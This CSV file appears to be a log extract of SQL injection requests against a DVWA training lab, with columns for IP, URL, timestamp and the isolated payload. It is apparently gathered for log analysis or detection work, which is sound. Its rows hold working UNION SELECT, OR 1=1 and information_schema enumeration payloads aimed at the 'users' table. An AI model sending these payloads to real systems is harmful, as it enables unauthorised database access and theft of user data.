ip,url,date,sqlInjection
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%23&Submit=Submit%23,15/May/2024:04:47:36,%27+union+select+database%28%29%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29&Submit=Submit%23,15/May/2024:04:47:40,%27+union+select+database%28%29&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29+%23&Submit=Submit%23,15/May/2024:04:47:47,%27+union+select+database%28%29+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23,15/May/2024:04:47:53,%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23,15/May/2024:04:47:58,%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23,15/May/2024:04:48:04,%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23,15/May/2024:04:48:08,%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5%2C6+%23&Submit=Submit%23,15/May/2024:04:48:13,%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5%2C6+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5+%23&Submit=Submit%23,15/May/2024:04:48:17,%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23,15/May/2024:04:48:20,%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23,15/May/2024:04:48:24,%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23,15/May/2024:04:48:29,%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1+%23&Submit=Submit%23,15/May/2024:04:48:32,%27+union+select+database%28%29%2C1+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:48:55,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:49:01,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1+%23&Submit=Submit,15/May/2024:04:49:27,%27+union+select+database%28%29%2C1+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+name%2C+2+from+dvwa+%23&Submit=Submit%23,15/May/2024:04:50:28,%27+union+select+name%2C+2+from+dvwa+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+2+from+information_schema.tables&Submit=Submit%23,15/May/2024:04:50:56,%27+union+select+1%2C+2+from+information_schema.tables&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+table_name+from+information_schema.tables&Submit=Submit%23,15/May/2024:04:51:07,%27+union+select+1%2C+table_name+from+information_schema.tables&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23,15/May/2024:04:51:25,%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit,15/May/2024:04:51:33,%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23,15/May/2024:04:52:35,%27+union+select+1%2C+column_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:53:00,%27+union+select+1%2C+column_name+from+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:53:22,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:00,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:12,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:15,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:25,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:56,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:56:17,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:57:38,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:57:58,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:58:08,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:58:56,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:59:38,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:00:19,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:00:46,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23,15/May/2024:05:01:30,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23,15/May/2024:05:01:47,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:01:53,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:02:50,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:06:15:21,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:06:15:24,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
